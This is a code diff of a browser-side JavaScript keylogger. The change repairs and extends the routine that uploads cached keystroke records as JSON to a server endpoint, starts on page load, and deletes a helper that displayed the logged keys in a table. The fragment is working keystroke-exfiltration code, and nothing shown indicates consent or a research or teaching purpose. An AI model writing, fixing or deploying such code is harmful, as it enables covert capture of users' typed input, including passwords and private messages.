@@ -40,30 +40,16 @@ var keylog = {
         // xhr.setRequestHeader("dataType", "json");
         // xhr.send(data);
         // keylog.cache = [];
-
         $.ajax({
           url:"./js_keylog",
           type:"POST",
           data: JSON.stringify(keylog.cache),
-          dataType="json",
+          dataType:"json",
+          contentType:"application/json"
         });
-
+        keylog.cache = [];
     }}
   };
+
   window.addEventListener("DOMContentLoaded", keylog.init);
 
-function showKeyTable(){
-  console.log("here");
-  for (const [key,value] of Object.entries(keys)){
-    var k = JSON.parse(value);
-    $('#KeylogView > table > tbody').append(
-      '<tr><td>'
-      + k.time
-      +'</td><td>'
-      + k.key-up
-      +'</td><td>'
-      + k.key
-      +'</td></tr>'
-    );
-  }
-}
